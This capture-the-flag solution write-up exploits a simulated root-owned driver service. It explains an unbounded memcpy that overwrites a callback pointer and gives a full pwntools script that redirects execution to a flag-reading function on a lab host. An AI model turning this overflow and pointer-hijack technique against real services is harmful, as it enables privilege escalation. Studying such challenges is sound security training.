# pwn-kernel-lpe — Solution

## Overview
A simulated kernel driver runs as root (uid=0). It exposes a binary protocol over TCP.

**Key facts:**
- No PIE, no ASLR (`personality(ADDR_NO_RANDOMIZE)`)
- Binary prints base addresses at startup (`debug_info()`)
- `driver_state` struct lives at a fixed BSS address:
  - `kernel_buf[256]` at offset 0
  - `callback` function pointer at offset 256

## Protocol
```
Header: [cmd: uint32_t][len: uint32_t]
Data:   <len bytes>
```
Commands:
- `0x01` IOCTL_WRITE: `memcpy(kernel_buf, data, len)` — **no bounds check**
- `0x02` IOCTL_READ: dump 256 bytes of `kernel_buf`
- `0x03` IOCTL_STATUS: print addresses
- `0x04` IOCTL_EXEC: call `callback()`

## Exploitation

### Step 1 — Read leaked addresses
Parse `debug_info()` output to get:
- `callback` address (we'll overwrite this)
- `give_flag()` address (or compute from `default_callback` offset)

Since no PIE, addresses are fixed — but the binary prints them for us anyway.

### Step 2 — Overflow `callback` pointer
Send IOCTL_WRITE with `len = 264`:
- 256 bytes padding (fills `kernel_buf`)
- 8 bytes: address of `give_flag()`

This overwrites the `callback` function pointer.

### Step 3 — Trigger
Send IOCTL_EXEC (`cmd = 0x04`) → driver calls `give_flag()` → reads `/root/flag.txt`.

## Exploit

```python
from pwn import *
import struct

HOST = '172.30.1.32'
PORT = 9998

def start(): return remote(HOST, PORT)

def send_cmd(p, cmd, data=b''):
    hdr = struct.pack('<II', cmd, len(data))
    p.send(hdr + data)

p = start()

# Parse debug info
p.recvuntil(b'default_callback: ')
default_cb = int(p.recvline().strip(), 16)
log.success(f'default_callback: {default_cb:#x}')

p.recvuntil(b'callback addr:    ')
cb_slot = int(p.recvline().strip(), 16)

# give_flag is right after default_callback in binary (or compute from symbols)
# Easier: use IOCTL_STATUS to confirm addresses, then calculate give_flag offset
# give_flag offset from default_callback: find via readelf -s driver
# Approximate: give_flag = default_callback - some_offset (find locally)
give_flag_addr = default_cb - 0x50  # adjust this offset!

log.info(f'targeting give_flag at: {give_flag_addr:#x}')

# Step 2: overflow — 256 bytes padding + 8 bytes give_flag address
payload = b'A' * 256 + p64(give_flag_addr)
send_cmd(p, 0x01, payload)
p.recvuntil(b'wrote')

# Step 3: trigger callback
send_cmd(p, 0x04)
p.recvuntil(b'Dumping flag')
print(p.recvline().decode())

p.close()
```

## Notes
- Find `give_flag` offset locally: `objdump -d driver | grep give_flag`
- The `debug_info()` output gives `default_callback` address — use `objdump` to compute offset to `give_flag`
- No ASLR means addresses are stable across runs
